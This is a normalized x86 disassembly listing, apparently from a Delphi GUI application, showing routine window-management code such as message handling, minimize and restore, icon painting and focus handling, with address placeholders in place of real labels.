call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42481c
push eax
push 0x1
push 0x80
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_42481c
push eax
push 0xfffffff2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
mov eax [ ebp - 0x8 ]
push eax
call DeleteMenu
sub_423d48
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x3c ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x5c ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x58 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x5c ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x60 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
call sub_422848
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x50 ] edx
sub_423dec
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0xffffffff
push 0x4
mov eax [ ebp + 0x8 ]
push eax
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x24 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x8
push 0xffffffec
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x80 ]
mov edx [ ebp + 0x8 ]
call sub_43c264
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
call sub_434714
cmp eax [ ebp + 0x8 ]
je r-xdata
sub_423e6c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x84 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x84 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
mov [ ebp - 0x10 ] al
lea eax [ ebp - 0x14 ]
push eax
push sub_423dec
call EnumWindows
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ ebp - 0x14 ]
push eax
call GetWindow
mov [ ebp - 0x14 ] eax
push 0xffffffec
mov eax [ ebp - 0x14 ]
push eax
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
mov [ ebp - 0x14 ] 0xfffffffe
mov [ ebp - 0xc ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
call sub_43c464
push eax
call SetWindowPos
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
sub_423f60
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x84 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
dec [ eax + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x84 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ ebp - 0x8 ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
call sub_43c464
push eax
call SetWindowPos
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
sub_423fe8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_424018
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x1
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_424048
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0x1a
jne r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_448884
mov eax [ rw-data ]
call sub_422e7c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_425660
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_425660
sub_4240b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4240f0
push ebp
mov ebp esp
add esp 0xffffffbc
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call BeginPaint
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42481c
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call DrawIcon
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
sub_42413c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4247d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x98 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_424048
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0x112
jg r-xdata
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
cmp eax 0xb01a
jg r-xdata
je r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x1c ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0xb01f
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x98 ]
mov edx [ ebp - 0xc ]
call sub_43c464
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4254b0
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call IsIconic
test eax eax
jne r-xdata
cmp eax 0xb001
jg r-xdata
mov eax [ ebp - 0x4 ]
call sub_424854
jmp r-xdata
sub eax 0x100
je r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0x11
je r-xdata
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x24 ]
jne r-xdata
sub eax 0xb016
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42492c
jmp r-xdata
jmp r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
add eax 0xfffffff9
cmp eax 0xd
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_424f98
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_424f20
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
xor eax eax
call sub_41a234
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_424db0
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe2 ] 0x0
je r-xdata
add eax 0xfffffece
sub eax 0x7
jb r-xdata
push ebp
call sub_4240b4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42481c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_423538
push ebp
call sub_4240b4
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8c ] 0x1
jmp r-xdata
push ebp
call sub_4240b4
pop ecx
jmp [ eax * 4 + jump_table_4241f0 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_4263c4
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax 0xbc00
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0xaec7
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_439a48
push ebp
call sub_4240b4
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_4240b4
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call PostMessageA
push ebp
call sub_4240b4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
call sub_434714
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xea ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
push ebp
call sub_4240b4
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
neg eax
sbb eax eax
neg eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_42135c
jmp r-xdata
push ebp
call sub_4240b4
pop ecx
jmp r-xdata
push ebp
call sub_4240f0
pop ecx
jmp r-xdata
push ebp
call sub_4240b4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_423f60
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_434714
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_423f38
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_423f60
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_423f4c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_41a0b0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9c ] eax
push ebp
call sub_4240b4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x9c ]
call sub_41a168
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x9c ] edx
mov eax [ ebp - 0x20 ]
call sub_434714
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_448fcc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x90 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x20 ]
call sub_434714
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax [ ebp - 0x20 ]
call sub_42df28
mov eax [ ebp - 0x10 ]
push eax
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x90 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
call GetProcAddress
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call [ ebp - 0x18 ]
jmp r-xdata
sub_42481c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
call sub_416770
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
push 0x7f00
push 0x0
call LoadIconA
mov [ ebp - 0x8 ] eax
sub_424854
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423f38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_423818
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
push 0x40
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_434714
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xf2 ] 0x0
je r-xdata
sub_42492c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_423818
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetWindowPos
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
adc eax 0x0
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
call sub_423f60
mov eax [ rw-data ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x213 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xfa ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
call sub_434714
push eax
call SetFocus
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_41ead0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_421558
sub_424a5c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call GetLastActivePopup
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x24 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
call SetForegroundWindow
sub_424ab8
push ebp
mov ebp esp
add esp 0xfffffef8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x7c ]
call sub_44cb34
push 0x100
lea eax [ ebp - 0x108 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call GetWindowTextA
mov ecx eax
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x8 ]
call sub_44cbc8
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_424b10
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424ba2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x7c
mov edx [ ebp - 0x8 ]
call sub_44cb34
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_424ab8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_44ce70
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetWindowTextA
mov eax [ ebp - 0x4 ]
add eax 0x7c
call sub_44cae0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ba9
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_424bb0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call IsDialogMessageA
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x9 ] al
sub_424bf0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x217 ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x60 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x23c ]
push eax
call TranslateMDISysAccel
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x9 ] al
sub_424c5c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x100
jb r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x108
ja r-xdata
call GetCapture
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push 0xfffffffa
mov eax [ ebp - 0x10 ]
push eax
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
add eax 0xbc00
push eax
mov eax [ ebp - 0x10 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_428e90
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x9 ] 0x1
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_434714
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
add eax 0xbc00
push eax
